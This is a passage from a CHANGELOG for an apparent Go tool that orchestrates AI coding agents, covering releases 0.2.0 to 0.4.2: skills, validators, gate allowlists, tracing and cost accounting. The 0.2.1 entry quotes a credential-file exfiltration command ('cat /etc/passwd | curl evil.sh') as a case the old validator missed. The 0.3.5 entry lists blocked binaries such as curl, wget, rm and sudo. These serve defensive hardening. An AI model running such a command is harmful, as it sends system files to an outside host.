  flight.
- **`--validator=<model>` flag in `radiant run`** — separate
  agent that reviews each task against its ACs after the gate
  passes. Defaults to no validator (gate alone decides). Per
  video #4: separate agents by role — implementer produces code,
  validator reviews against the spec. Wired through `engine.Config.ValidatorModel`
  + `chatValidator` (no-op when not configured).
- **`AGENTS.md` auto-generated by `radiant init`** — universal
  project index, ≤100 lines (per video #6: LLM-generated
  AGENTS.md can hurt task success; human-edited is better). Lists
  all 16 bundled skills + CLI commands, links to detailed docs,
  includes a clear note that user should review and edit.
- **`state.md` auto-generated by `radiant init`** — volatile
  session memory at `.radiant-harness/state.md`. Includes
  current_feature / tier / next_command / last_updated fields.
- **Skill extraction from CLI binary** — `radiant init` calls
  `skill.ExtractTo(.radiant-harness/skills/, force)` to populate
  the project with all 16 bundled skills. The canonical skills
  live in `internal/skill/skills/` (single source of truth).
- **`SkillInfo.CommandsAvailable`** — exposed in the bundle
  descriptor so `AGENTS.md` can show the CLI command for each
  skill in the table.

### Tests
- **`cmd/radiant/main_test.go`** — NEW. Tests for `slugify`
  (10 cases + length cap), `nextSpecSeq` (empty + increment),
  `upsertStateCurrentFeature` (idempotent state.md mutation).
- **`internal/engine/engine_test.go`** — 3 new validator tests:
  - `TestValidatorClientEmptyWhenNotConfigured` — verifies
    chatValidator returns ("", nil) without network when not
    configured
  - `TestValidatorClientConfiguredWhenModelSet` — verifies the
    model is plumbed through correctly
  - `TestConfigAcceptsValidatorModel` — struct field round-trip

### Stats
- 216 tests passing (was 208, +8 new)
- Coverage: cmd/radiant NEW package now tested
- All 6 OS/arch targets build cleanly
- Version 0.4.1 → 0.4.2
- vet clean, gofmt clean

### What this closes
Sprint 10 is now **feature-complete** for the methodology merge.
The full pipeline works end-to-end:

```bash
radiant init meu-app                          # scaffolds +16 skills + AGENTS.md
# agent (or human) reads AGENTS.md, picks a skill
radiant spec "add JWT auth" --ac=... --task=...  # produces spec.md + tasks.md
radiant run specs/0001-... --model ...          # implements + gates
# validator LLM reviews if --validator set
radiant validate specs/0001-...                # DoD check
radiant handoff --feature=... --next-command=...  # pause
# later session:
radiant state                                  # read resume point
```

## [0.4.1] — 2026-06-24

Sprint 10 second batch: 16 vendor-neutral skills, all rewritten
top-of-line to match the open `docs/SKILL-SCHEMA.md` spec.

### Added
- **15 skills rewritten** (top-of-line, NOT ported from spec-driven):
  - `nova-feature` — start a feature; tier it; produce spec.md +
    tasks.md with measurable ACs
  - `clarificar` — structured interview to sharpen ambiguous ACs
  - `validar` — DoD check; verify code matches spec, document
    SPEC_DEVIATION
  - `kickoff` — greenfield discovery or brownfield mapping;
    vision, personas, MVP canvas, context map
  - `handoff` — pause/resume session via `.radiant-harness/state.md`
  - `integracoes` — discover MCPs/tools with account-boundary safety
  - `mapear` — analyze existing codebase → assessment.md
  - `diagramar` — C4-model Mermaid diagrams (Context/Container/
    Component)
  - `adr` — Architecture Decision Records in Nygard format
  - `revisar-pr` — PR review against spec; SPEC_DEVIATION report
  - `auditar` — project-wide conformity (frontmatter, links, AC
    traceability)
  - `metricas` — Lead Time, Throughput, maturity score (blameless)
  - `setup-ci` — generate CI workflow with radiant gates
  - `camada-agentica` — generate AGENTS.md + opt-in native views
  - `evals` — spec→code fidelity score, file:line evidence
  - `roadmap` — sequence features by value × effort, dependency graph
- **Each skill** has full schema (frontmatter.yaml + SKILL.md):
  - Decision tree (ASCII)
  - Workflow (numbered steps)
  - Examples (at least 1 per skill)
  - Anti-patterns (with wrong/correct pairs)
  - Failure modes (recovery procedures)
  - Related skills (cross-references)
  - Zero Claude-centrism: no `CLAUDE.md`, no slash commands as
    primary entry, references are universal
- **`TestAllBundledSkillsValidateCleanly`** — CI guard that fails
  if any bundled skill breaks the schema. Tests run per-skill.

### Stats
- 16 skills bundled (was 1 in 0.4.0)
- 208 tests passing (was 207, +1 aggregate regression test)
- Coverage: skill package ~100%
- 6/6 cross-compile clean
- vet clean, gofmt clean

### What's next (Sprint 10 third batch)
- `radiant init` extracts skills to `.radiant-harness/skills/`
- `radiant spec <intent>` command (interactive interview)
- `AGENTS.md` auto-generation
- `radiant state` + `radiant handoff` commands
- `--tier` flag with auto-detect
- Native view generation opt-in via `--agent=<list>`

## [0.4.0] — 2026-06-24

Sprint 10 (first batch): vendor-neutral skill runtime. Foundation
of the methodology merge documented in `docs/HARNESS-PLAN.md`.

### Added
- **`internal/skill/` package** — the runtime for the open skill
  format (`docs/SKILL-SCHEMA.md`). Implements:
  - `Skill` struct: parsed representation of a skill (frontmatter +
    SKILL.md)
  - `Load`, `LoadFromFS`: parse a skill from disk or embedded FS
  - `Validate`: enforces the 10 schema rules, returns
    `[]ValidationError`
  - `Bundle`: enumerates the skills embedded in the CLI binary
  - `ExtractTo`: writes the bundle to a project dir
    (`.radiant-harness/skills/`); respects `force` flag
  - All 15 validation rules from `docs/SKILL-SCHEMA.md` §6 enforced
  - Single dependency: `gopkg.in/yaml.v3` (parse frontmatter.yaml)
- **Embedded skills** via `//go:embed all:skills` — bundled in the
  CLI binary, extracted during `radiant init`. No network needed
  for skill installation.
- **`nova-feature` skill** — first showcase skill, rewritten
  top-of-line to match the new schema. Includes decision tree,
  workflow (7 steps), 3 worked examples (trivial/feature/
  architecture), 6 anti-patterns, 5 failure-mode recovery
  procedures, related-skill cross-references. Validates cleanly
  against the schema.
- **`radiant skills` CLI command** — `radiant skills list` shows
  bundled skills with name/version/tier/description;
  `radiant skills validate <dir>` validates a skill against the
  10 schema rules.
- **`radiant --help` advertises** the skill runtime — agents
  reading the help text can see what's available.

### Defaults set on 5 open questions
- **Distribution**: keep `@quant-risk/radiant-harness` (npm) +
  `radiant-harness` (go install) — no change
- **Tier language**: English (Trivial/Feature/Architecture) —
  matches our docs and is internationally accessible
- **CLI skill execution**: Both — CLI emits skills for agents AND
  provides equivalent subcommands for power users
- **Update channel**: just `latest` for now; stable/beta is a
  future-sprint problem
- **MCP integration**: discover + list only; auto-configure is
  more invasive and lives in a later sprint

### Changed
- Skills directory moved from `internal/scaffold/templates/skills/`
  to `internal/skill/skills/` — single source of truth for bundled
  skills. `internal/skill` is now the canonical home.
- Version bumped from `0.3.5` to `0.4.0` — minor → minor because
  the methodology merge is a **new capability**, not a breaking
  change. Existing CLI commands and flags work identically.

### Stats
- 207 tests passing (up from 188 in 0.3.5)
- New package: `internal/skill/` with 19 dedicated tests
- 1 new skill rewritten top-of-line (`nova-feature`); 14
  remaining to migrate to the new schema (queued for next sprints)
- Coverage: harness 61%, llm 84%, benchmark 77%, spec 88%, quality
  60%, engine 47%, policy 100%, **skill NEW (100% of rules + load
  + bundle + extract)**
- 6/6 cross-compile clean

### What's next (Sprint 10 second batch)
- Rewrite the remaining 14 skills (clarificar, validar, kickoff,
  integrar, mapear, diagramar, adr, handoff, metricas, audit,
  setup-ci, camada-agentica, evals, revisar-pr) to match the new
  schema
- `radiant init` updated to extract skills to
  `.radiant-harness/skills/`
- `radiant spec <intent>` command (interactive interview)
- `AGENTS.md` auto-generated
- `radiant state` + `radiant handoff`
- `--tier` flag with auto-detect
- Native view generation opt-in via `--agent=<list>`

## [0.3.5] — 2026-06-24

Sprint 9: gate command allowlist deduplication. Closes the drift
risk flagged in the Sprint 6 audit — three packages
(`internal/engine/`, `internal/harness/`, `internal/quality/`)
maintained their own copies of the gate allowlist, the gate
validator, the logical-ops splitter, and the shell tokenizer.

### Added
- **`internal/policy/`** — new package. Single source of truth for
  the harness's command allowlists and the gate-command tokenizer.
  Exports:
  - `AgentCommands`, `GateBinaries` — the two closed sets.
  - `IsAgentAllowed`, `IsGateBinaryAllowed` — lookup helpers
    (comma-ok form so presence and absence are distinguishable,
    unlike the previous `!= struct{}{}` pattern which was always
    false).
  - `ValidateGateCommand` — replaces three duplicated validator
    functions. Now handles double-quoted strings too (the harness
    version was more thorough; engine/quality were not).
  - `SplitOnLogicalOps`, `SplitShellTokens` — quote-aware
    tokenizers used by the validator.
  - `IsShellOp` — public helper for "is this token a shell
    metacharacter".
  - `AllowedAgentCommands()`, `AllowedGateBinaries()` — sorted
    helpers used in error messages.

- **`TestGateBinariesExcludeDestructive`** — locks the closed set
  against accidental widening of `rm`, `mv`, `curl`, `wget`, `dd`,
  `chmod`, `chown`, `sudo`, `bash`, `sh`, `zsh`, `fish`. If someone
  adds one of these to the allowlist, this test fails and forces a
  deliberate, reviewed change rather than a silent widening.

- **`TestValidateGateCommandAcceptsAllowed`** — verifies the happy
  path: every entry in `GateBinaries` is accepted when used as a
  standalone gate. A failure here means the allowlist and validator
  disagree — the exact bug the policy extraction is meant to
  prevent.

### Changed
- `internal/engine/`: `gateAllowlist`, `validateGateCommand`,
  `splitOnLogicalOps`, `splitShellTokens`, `isShellOp` are now
  thin delegations to `internal/policy`. The duplicate definitions
  were removed (≈140 lines deleted from engine.go).
- `internal/harness/agent.go`: `allowedAgentCommands`,
  `allowedGateBinaries` are now re-exports of `policy.AgentCommands`
  and `policy.GateBinaries`. The five duplicate helper functions
  are thin delegations (≈160 lines deleted from agent.go).
- `internal/quality/validate.go`: same pattern as engine/harness
  (≈100 lines deleted from validate.go).
- All three packages now share a single error message format:
  `"gate binary %q is not in the allowlist (allowed: %s)"` — so
  the operator gets the full closed-set hint regardless of which
  code path rejected the gate.

### Stats
- 188 tests passing (up from 176 in 0.3.4)
- New package: `internal/policy/` with 12 dedicated tests
- Lines deleted across the 3 consumer packages: ≈400
- Lines added in `internal/policy/`: ≈490 (canonical + tests)
- Net: a single source of truth where there were three near-copies
- Coverage: harness 61.1%, llm 84.3%, benchmark 77%, spec 88.5%,
  quality 59.5%, engine 47.0%, **policy NEW (full coverage of
  closed set + validator + tokenizers)**

## [0.3.4] — 2026-06-24

Sprint 8: gate command output cap. Closes the OOM vector flagged in
the Sprint 6 audit (every gate call site used `cmd.CombinedOutput()`
with no byte cap).

### Added
- **`--max-gate-output <bytes>` flag** on `radiant run`. Default
  10 MiB. Caps the stdout+stderr captured from each gate command.
  When a gate writes more than the cap, the captured buffer is
  clipped at the byte boundary, a `[output truncated at N bytes]`
  marker is appended so downstream consumers know the output is
  incomplete (not a successful empty test), and the gate is killed
  via broken-pipe on its next write. Without this, a chatty gate
  (`pytest -v`, `go test -v`, anything that logs each test case)
  could OOM the harness parent.

  Implementation: switched all three gate runners
  (`internal/engine/`, `internal/harness/`, `internal/quality/` —
  both POSIX and Windows build tags) from `CombinedOutput()` to
  `StdoutPipe` + `StderrPipe` + `io.LimitReader(io.MultiReader(...),
  int64(maxOutput))`. The pipe-based approach means we never read
  more than the cap into memory — the gate's next write blocks
  until we close our end, then fails with SIGPIPE (POSIX) or
  ERROR_BROKEN_PIPE (Windows) and the process exits.

- **`engine.Config.GateMaxOutputBytes`** — wired through `New()`,
  default 0 (which the gate runners translate to `DefaultGateMaxOutput`).
  `0` keeps the "use package default" contract; set explicitly to
  disable the cap if you really want to.

### Fixed
- **OOM vector on chatty gates** — same root cause as the audit
  finding. `cmd.CombinedOutput()` reads the entire stdout+stderr
  into a single `[]byte` with no upper bound. A `pytest` test suite
  with verbose output could push hundreds of MiB into the harness
  process. Now bounded by `--max-gate-output`.

### Tests
- `TestRunShellGateRespectsCap` — verifies a 64KB-output gate is
  truncated at the 1024-byte cap with the marker appended.
- `TestRunShellGateUnderCap` — verifies a small gate returns its
  full output untouched, no marker.
- `TestRunShellGateDefaultCap` — verifies `maxOutput=0` falls back
  to the package default (zero-means-default contract).
- `TestRunShellGateReportsFailure` — regression guard: non-zero
  exit codes still surface as errors with the captured output
  available, even after the pipe-based rewrite.

### Stats
- 176 tests passing (up from 172 in 0.3.3)
- Coverage: harness 61.1%, llm 84.3%, benchmark 77%, spec 88.5%,
  quality 59.5%, engine 47.0% (+1.5pp from new gate tests)
- Zero race conditions
- 6 OS/arch targets compile cleanly

## [0.3.3] — 2026-06-24

Sprint 7: planner actually fires, JSONL trace export, race fix,
6-target cross-compile.

### Fixed
- **Data race on `Engine.currentTaskID`** (`internal/engine/engine.go`).
  The field was read in `chatWith` without holding the mutex, while
  `executeTask`'s preamble/cleanup wrote under it. Triggered under
  parallel task phases — `-race` flagged every run. Fixed by adding
  `e.mu.Lock()` / `Unlock()` around the read. New test
  `TestCurrentTaskIDLockedRead` stresses the locked-read pattern
  under 4 writer goroutines × 500 iterations; race detector stays
  silent.

### Added
- **`runPlannerAdvisory`** — `--planner` is no longer a no-op. After
  parsing the spec and tasks, the engine calls the planner LLM once
  with the full spec + tasks body and asks for a bullet list of
  concerns (ambiguous Given/When/Then, missing ACs, unprovable tasks).
  The planner's response is parsed into `Result.Warnings` and surfaced
  in the post-run summary, but **never blocks execution** — the spec
  is the source of truth. If the planner call fails (timeout, rate
  limit, network), the run continues with a warning and no advisory
  output. The call goes through `chatPlanner`, so it appears in the
  trace summary under phase=`"planner"` and in any `--trace-out` JSONL.

  The output now reads:

  ```
  ⚠ Planner raised 3 concern(s) (advisory):
    • AC2 says "fast enough" without a quantitative threshold
    • Task 4 has no test command in the table
    • AC5 references a library not in the Out-of-scope list
  ```

- **`--trace-out <file>` flag** on `radiant run`. Drains the trace log
  to disk as JSONL (one event per line) using the standard `jq`-able
  shape: `{"type":"chat","phase":"implement","task_id":7,"model":
  "claude-sonnet-4.5","input_tokens":1200,"output_tokens":350,
  "latency_ms":4500,"ok":true}`. Atomic write via temp + fsync +
  rename — a crash mid-write leaves no torn file. Failure to write
  is non-fatal: the run still completes; the operator sees
  `⚠ trace-out failed: ...` and the regular output.

  Useful for cost debugging (`jq 'select(.phase=="planner") |
  {model, input_tokens, output_tokens}' trace.jsonl | jq -s`),
  observability pipelines (Datadog/Logflare/Honeycomb all ingest
  JSONL natively), and regression detection (compare per-call latency
  across releases).

- **Two new cross-compile targets**: `linux/arm64` (AWS Graviton,
  Raspberry Pi 4/5, ARM servers) and `windows/arm64` (Surface Pro X,
  ARM-native Windows). The Makefile `release` target now produces all
  six OS/arch pairs. Verified with `file` — ARM binaries are
  statically linked ELF aarch64 and PE32+ Aarch64 respectively.

### Changed
- `Makefile` release target now documents each target's use case in a
  comment block (CI vs Apple Silicon vs ARM servers vs Surface Pro),
  so future contributors can see at a glance which platform needs
  which target.

### Stats
- 172 tests passing (up from 168 in 0.3.2)
- Coverage: harness 61.1%, llm 84.3%, benchmark 77%, spec 88.5%,
  quality 59.5%, engine 45.5% (+1.5 from race + JSONL tests)
- Zero race conditions (50-goroutine stress for trace log + token
  accounting; 4-writer + locked-reader stress for currentTaskID)
- 6 OS/arch targets compile cleanly: linux/amd64, linux/arm64,
  darwin/amd64, darwin/arm64, windows/amd64, windows/arm64

## [0.3.2] — 2026-06-24

Sprint 6: multi-agent routing, lightweight tracing, VS Code CodeLens.

### Added
- **Multi-agent routing** via `--planner` and `--implementer` flags on
  `radiant run`. Pick a different LLM per RPI phase: Opus for planning,
  Sonnet for implementation, Gemini for correction — whatever your
  price/quality tradeoff dictates. Both flags are optional; when unset,
  they fall back to `--model` so existing single-model runs are
  byte-identical in behaviour.

  ```bash
  radiant run specs/0042-auth \
    --model claude-sonnet-4.5 \
    --planner claude-opus-4.1 \
    --implementer claude-sonnet-4.5
  ```

  Internally: `engine.Config` gained `PlannerModel` and
  `ImplementerModel` fields. The engine creates three clients
  (default + planner + implementer) and `chatWith` routes each call to
  the right one based on which entry point (`chatPlanner`,
  `chatImplementer`, `chatImplementerCorrect`) was invoked. The
  implementer client is used for both the first-attempt `implement`
  call and the auto-correction `correct` call, so multi-agent routing
  gives users two independent tuning knobs.

- **Lightweight tracing** via `engine.TraceEvent`. Every LLM call now
  records `{type, phase, task_id, model, input_tokens, output_tokens,
  latency_ms, ok, detail}` to an in-memory slice. Drained by
  `DumpTrace()` and summarised at the end of `radiant run --verbose`.
  Output groups by phase so a multi-agent run makes the cost split
  obvious:

  ```
  Trace summary (per phase):
    planner     2 calls, in=4820 out=1120 tokens, total 8401ms
    implement   5 calls, in=21000 out=3800 tokens, total 28200ms
    correct     1 calls, in=4200 out=920 tokens, total 6100ms
  ```

  No external deps. Tracing is always on (cheap, append-only) but only
  printed when `--verbose` is set, so non-verbose runs pay zero
  user-visible cost. Race-tested with 50 goroutines × 100 appends.

- **VS Code CodeLens on `tasks.md`** — every row whose last table cell
  contains a backtick-quoted shell command now shows a `▶ Run gate`
  inline action. Click it and the command runs in a terminal — no
  copy/paste needed. Wired through the existing `radiant.runGate`
  command, so the terminal plumbing, shell-quoting, and cd-to-project
  are reused without duplication.

### Changed
- **`chatTracked` split into three entry points**: `chatPlanner`,
  `chatImplementer`, `chatImplementerCorrect`. All three share the
  same underlying `chatWith` body (so the response parsing, retry,
  and token accounting are identical), but each records the right
  phase tag on its `TraceEvent`. This is the plumbing that makes
  multi-agent routing observable in the trace summary.

### Stats
- 168 tests passing (up from 164 in 0.3.1)
- Coverage: harness 61.1%, llm 84.3%, benchmark 77%, spec 88.5%,
  quality 59.5%, engine 44.0% (+1.5 from new tracing tests)
- Zero race conditions (50-goroutine stress tests for trace log + token accounting)
- 6 OS/arch targets compile cleanly: linux/amd64, linux/arm64,
  darwin/amd64, darwin/arm64, windows/amd64, windows/arm64

## [0.3.1] — 2026-06-24

Sprint 5: Anthropic native, eval suite, project moves to iCloud.

### Added
- **`internal/llm/anthropic.go`** — native Anthropic Messages API
  client. Sends to `POST /v1/messages` with `x-api-key` and
  `anthropic-version: 2023-06-01` headers. Splits the system prompt
  out of the messages array (Anthropic's shape, not OpenAI's). Honors
  `Retry-After` and exponential backoff the same way the OpenAI
  client does. Includes streaming support via SSE.

  `Client.Chat()` now dispatches to `chatAnthropic` whenever the
  configured provider is `ProviderAnthropic`. Going through Anthropic
  directly is faster, cheaper, and unlocks features the OpenAI
  shim doesn't expose (extended thinking, prompt caching). A custom
  `BaseURL` still works — useful for localhost mocks and Anthropic-
  compatible gateways.

- **`radiant eval`** — single-prompt harness for comparing providers
  on a representative workload. Sends the same prompt N times
  (default 3), reports median + mean latency, total tokens,
  estimated USD cost. JSON output via `--output` for trend tracking
  across releases. Useful before committing to a provider for
  production.

### Fixed
- **`chatAnthropic` was using a hardcoded URL**, ignoring `Model.BaseURL`.
  Now calls `c.baseURL()` so test servers (httptest) and localhost
  proxies work. Found by `TestAnthropicSendsCorrectHeaders` — the
  test client was hitting api.anthropic.com with a fake API key and
  getting 401s back instead of reaching the mock.

### Changed
- **Project location**: moved from `~/Downloads/radiant-harness-main`
  to `~/Library/Mobile Documents/com~apple~CloudDocs/projects/radiant-
  harness-main` (iCloud Drive). All paths are still relative to the
  repo root so build, test, and CI commands are unchanged.

### Stats
- 164 tests passing (up from 157 in 0.3.0)
- Coverage: harness 61.1%, llm 84.3%, benchmark 77%, spec 88.5%,
  quality 59.5%, engine 42.5%
- Zero race conditions
- 6 OS/arch targets compile cleanly: linux/amd64, linux/arm64,
  darwin/amd64, darwin/arm64, windows/amd64, windows/arm64

## [0.3.0] — 2026-06-24

Sprint 4: cost display, rate-limit awareness, package manager manifests.

### Added
- **Token accounting** in `engine.Result`. Every Chat call now reports
  `InputTokens` and `OutputTokens`, accumulated across every task and
  retry. Concurrent accumulation is mutex-protected; tested with 50
  goroutines × 100 calls each (5000 increments) with zero lost updates.
- **Cost display in `radiant run`** final output. Prints token totals
  and estimated USD cost using `llm.CostUSD()` against the
  vendor-published price table. If the model has no price entry, the
  output shows `<unknown — no price entry for "x">` instead of
  fabricating a number.
- **Rate-limit awareness** in the LLM client. HTTP 429 responses are
  classified as a new `RateLimitError` carrying the server's
  `Retry-After` hint. The retry loop honors `Retry-After` instead of
  exponential backoff, so a rate-limited provider isn't hammered.
  `parseRetryAfter` supports both RFC 7231 formats: delta-seconds
  (`Retry-After: 30`) and HTTP-date.
- **Package manager manifests** in `packaging/`:
  - `homebrew/radiant.rb` — Homebrew formula (macOS + Linux, ARM + x86)
  - `scoop/radiant.json` — Scoop manifest (Windows)
  - `aur/PKGBUILD` — Arch Linux AUR build (Arch, Manjaro, Endeavour)

  Each manifest documents the binary URL pattern, SHA256 placeholder
  (replaced at release time by goreleaser), and a smoke test
  (`radiant --version` for Homebrew, the version assertion for all).

### Stats
- 157 tests passing (up from 150 in 0.2.2)
- Cross-platform build: linux/amd64, darwin/arm64, windows/amd64,
  windows/arm64 all compile
- Zero race conditions under `go test -race`
- 5 OS/arch targets, 3 package managers

## [0.2.2] — 2026-06-24

Sprint 3: real cross-platform builds, auto model routing, cost estimation.

### Added
- **`--auto-route` flag** for `radiant run`. Picks a per-phase model
  based on the anchor preset: research routes to top-tier (Opus from
  a Sonnet anchor), plan/implement stay mid-tier. Falls back to the
  anchor if no sibling exists at the requested tier (e.g. DeepSeek
  family has no top-tier model).
- **`llm.AutoRoute(anchor, phase)`** function in
  `internal/llm/routing.go`. Vendor-aware routing — same family
  shared across presets.
- **`llm.CostUSD(model, input, output)`** estimates USD cost from a
  token count and a model name. `PricePerMTokensUSD` table covers all
  14 presets with vendor-published rates (Anthropic, OpenAI, Google,
  DeepSeek, Mistral, Groq, xAI, Xiaomi). `FormatCost(usd)` returns
  `$0.42` or `<$0.01` for human display.
- **Cross-platform lock** (`internal/harness/lock.go`) using atomic
  file rename. Works on Linux, macOS, AND Windows (NTFS). Replaces
  `syscall.Flock` which is Unix-only.
- **Cross-platform gate runner** via build tags:
  - `internal/harness/gate_unix.go` — `sh -c`
  - `internal/harness/gate_windows.go` — `cmd /c`
  - `internal/engine/gate_unix.go` and `gate_windows.go` (mirror)
  - `internal/quality/gate_unix.go` and `gate_windows.go` (mirror)

### Changed
- **Cross-platform build verified**: `GOOS=linux/amd64`,
  `GOOS=darwin/arm64`, AND `GOOS=windows/amd64` all compile cleanly.
  Was previously broken on Windows because `syscall.Flock` is
  Unix-only.
- **`State.Lock()` and `State.Release()`** rewritten to use the new
  rename-based lock. Same external behavior (blocks until acquired,
  serializes orchestrator runs) but works everywhere.

### Stats
- 150 tests passing (up from 118 in 0.2.1)
- Coverage: harness 61.1% (above 60% threshold!), quality 59.5%,
  benchmark 77%, llm 84%, spec 89%
- Zero race conditions under `-race` detector
- 3 OS targets × 2 architectures each compile and lint clean

## [0.2.1] — 2026-06-24

Sprint 2: empirical validation, gap closure, vendor diversity.

### Added
- **`radiant doctor`** — environment diagnostic (PATH, agents, LLM
  providers, gates, state directory). Run before `radiant run` to
  surface missing tools or unset API keys.
- **`radiant bench`** — cross-framework benchmark. Runs radiant-harness
  against itself plus any of {GitHub Spec Kit, OpenSpec, TLC, Superpowers}
  found on `$PATH`, captures duration + tokens + AC coverage, prints a
  markdown table sorted by score, optionally saves JSON via `--output`.
- **3 new LLM providers**: Mistral (`mistral-large-2`, `codestral-22b`),
  Groq (`groq-llama-3.3-70b`, `groq-mixtral-8x7b`), xAI (`grok-2`). All
  OpenAI-compatible, vendor-neutral.
- **5 new model presets** — total is now 14 across 7 vendors (Anthropic,
  OpenAI, Google, DeepSeek, Xiaomi, Mistral, Groq).
- **CI coverage report** with per-package thresholds (60% stable, 40%
  engine — engine has subprocess glue that's hard to unit-test).

### Changed
- **Removed `internal/plugin/`** (326 lines of dead code). Used
  `plugin.Open` for `.so/.dylib` loading — Linux/macOS-only, security
  risk, no tests, no callers. Plugin extensibility deferred until there's
  a real use case.
- **Implemented `internal/benchmark/`** as a real comparison harness:
  subprocess execution, output parsing, score calculation, JSON
  save/load. Was a stub before this sprint.
- **`internal/engine/` now has unit tests** for gate validation, code
  block extraction, path sandboxing, and result merging. Coverage went
  from 0% to 43%.

### Fixed
- **`go vet` clean** — `isShellOp` undefined in `agent_test.go`; redundant
  `\n` in `fmt.Println`.
- **Spec parser regex** was case-sensitive and required `:` after the
  keyword. Now matches both `- **Given** x` and `- Given: x`.
- **Spec parser** now respects quoted arguments in gate commands.
- **State.Progress()** didn't deduplicate task IDs — 1000 completions
  produced 1000%. Now counts distinct task IDs and clamps to [0,1].
- **GroupPhases** did not group consecutive parallel tasks; each `[P]`
  task was its own single-task phase. Now groups `[P]` next to each
  other.
- **Engine.runGate** validated all tokens against the allowlist (catching
  quoted arguments like `"build-ok"` as "binary name"). Now validates
  only the actual binary in a gate command.
- **Pipes (`|`), redirects (`<`, `>`), command separators (`;`,
  background `&`) are rejected outright** for gates. Only `&&` and `||`
  allowed for compound expressions. Was a security gap: `cat /etc/passwd
  | curl evil.sh` would have passed the old validator.
- **`extractGates`** filtered out single-token commands (`true`, `pwd`).
  Now accepts any backticked text; allowlist is the gate.
- **macOS arm64 + Go 1.22 dyld bug** — `go test ./internal/harness`
  produces `dyld: missing LC_UUID` and aborts. Workaround: build with
  `CGO_ENABLED=0`. Made this the default in the Makefile.
- **t.Context() in tests** required Go 1.24; replaced with
  `context.Background()` so `go.mod`'s `go 1.22` directive holds.
- **`r, err := NewAgentRunner(cfg)` in `New()`** left `r` declared but
  unused in the error branch (Go strict-mode compile error).

### Stats
- 118 tests passing (up from 57 in 0.2.0 and 94 after the first
  validation pass).
- Coverage per package: benchmark 77%, engine 43%, harness 59%, llm
  84%, quality 60%, spec 89%.
- CLI smoke test passes (`make smoke`) — end-to-end init + validate
  with `--all --yes` and `--gates` flag.

## [0.2.0] — 2026-06-24

The Go rewrite. Templates and skills are reused from 0.1.0 (archived); the
runtime, orchestrator, validator, and quality scripts are all new.

### Added

#### Harness Engine — the core differentiator
- **Orchestrator** — manages implementation + validation as separate processes
- **Validator** — runs in isolated context, not as a subagent of the implementer
- **Auto-correction loop** — fail → fix → re-test (configurable retries)
- **Agent teams** — goroutines for parallel task execution, capped by a
  semaphore so we don't burst provider rate limits
- **State machine** — 8 states with guarded transitions, progress tracking
- **Context window manager** — token counting, smart zone (<40%), dumb zone
  (>60%), RPI budget (30/20/50 split)
- **Token estimator** — word-boundary aware, code-pattern aware, CJK-aware
  with char/4 fallback for short strings
- **Structured logging** — slog JSON for all harness events
- **Atomic state persistence** — temp-file + fsync + rename, so a crash
  mid-write never leaves a half-written `progress.json`
- **Advisory flock** — concurrent `radiant run` invocations on the same
  project serialize instead of corrupting state
- **Command allowlists** — closed set of agent binaries and gate commands,
  so prompt injection or naive tasks.md can't shell out to arbitrary code
- **Path sandboxing** — emitted code blocks are checked against the project
  boundary before being written

#### Quality Scripts (Go rewrite)
- **Audit** — frontmatter validation, relative-link checking, spec presence
- **Fidelity** — spec→code AC coverage with flexible matching (AC-N, AC_N,
  AC1, AC 1 all normalized)
- **Mermaid** — diagram block validation (type, quotes, empty blocks)
- **Validate** — full UAT with AC→task mapping, Given/When/Then completeness,
  SPEC_DEVIATION detection, **optional `--gates` to actually run task gates**

#### Scaffold Engine
- **6 agent adapters** — Claude, Codex, Cursor, Copilot, Gemini CLI, Windsurf
- **Template embedding** — Go embed.FS for single-binary distribution
- **CLI** — cobra-based with init, validate, run, config, models

#### LLM Client (universal)
- **Provider-agnostic** — OpenRouter, OpenAI, Anthropic, custom BaseURL
- **Retry with backoff** — exponential + full jitter on 5xx, fail-fast on 4xx
- **Streaming** — SSE-aware with backpressure-friendly scan buffer
- **10 curated presets** — Claude Opus 4.1, Sonnet 4.5, GPT-5, GPT-5-Codex,
  Gemini 2.5 Pro, DeepSeek v4 Pro/Flash, MiMo v2.5 Pro, GPT-4o, Claude
  Sonnet 4
- **32k default MaxTokens** — up from 8k, matches the size of real SDD specs

#### Templates (15 skills, 7 spec templates)
- All 15 skills complete (56-97 lines each, zero stubs)
- 7 spec templates (spec, tasks, product, design, domain, lean, agent-contract)
- CLAUDE.md with RPI framework, context budget, UUIDv7/ULID strategy
- Golden example (Pulse) — end-to-end proof

#### Build & Distribution
- Makefile with cross-platform targets (linux, darwin, windows)
- Dockerfile (multi-stage Alpine build, Go 1.22)
- `.goreleaser.yml` for automated releases
- **GitHub Actions CI** — lint + test + cross-build on Go 1.22, 1.23, 1.24

#### VS Code Extension
- Tree views for Specs, Tasks, Progress (Tasks and Progress now populated)
- Status bar with live state, feature, and progress %
- File watcher on `.radiant-harness/progress.json` for live updates
- Run-gate command from the tasks.md context menu

### Changed
- Rewritten from TypeScript to Go for single-binary, native concurrency,
  elegant distribution
- CLAUDE.md rewritten with RPI framework (Research → Plan → Implement)
- README rewritten with research references (OpenAI, Anthropic, Martin
  Fowler, papers)
- Templates deduplicated (single source in `internal/scaffold/templates/`)

### Fixed
- Gemini TOML escaping (was broken in original `@igoruehara/spec-driven`)
- SessionStart hook now loads active spec via STATE.md parsing
- spec.template.md `alwaysApply` corrected to false
- EEXIST error when target directory is an existing file
- Golden example test command corrected for Node 22 `.mjs` support
- `--all` flag not being processed in CLI
- **go.mod directive** was set to an unreleased Go version, breaking
  reproducible builds; pinned to 1.22
- **`groupPhases` did not group consecutive parallel tasks** — each
  `[P]` task was emitted as its own single-task phase, defeating the
  whole point of goroutine parallelism. Now groups `[P]` tasks next to
  each other into one parallel phase and starts a new phase only when
  the kind changes (par → seq or seq → par)
- `r, err := NewAgentRunner(cfg)` in `New()` left `r` unused in the
  error branch (Go compile error in strict mode); now assigns explicitly
- `--gates` regex compiled inside the loop on every directory entry;
  hoisted to a single `regexp.MustCompile` outside the loop
- `t.Context()` in tests required Go 1.24; replaced with
  `context.Background()` so `go.mod`'s `go 1.22` directive is honored

### Security
- **Command allowlist for agent runner** — refuses to spawn anything not in
  `{claude, codex, cursor, copilot, gemini}` even if a spec asks for it
- **Gate command allowlist** — refuses to execute gates referencing
  binaries outside the closed set (`rm`, `curl`, `wget`, etc.)
- **Path sandboxing** — emitted code blocks must resolve inside the
  project directory
- **Timeouts everywhere** — agent invocations and gate runs have hard
  deadlines so a hung dependency can't stall the harness

### Vendor neutrality
- **`DetectAgent()` priority order** is now alphabetical; no agent is
  privileged. The "Claude first (best for SDD)" rationale was removed
  from the comment.
- **`radiant init` default** — `--yes` without `--agent=` now scaffolds
  **all** supported agents instead of silently picking Claude. No-flag
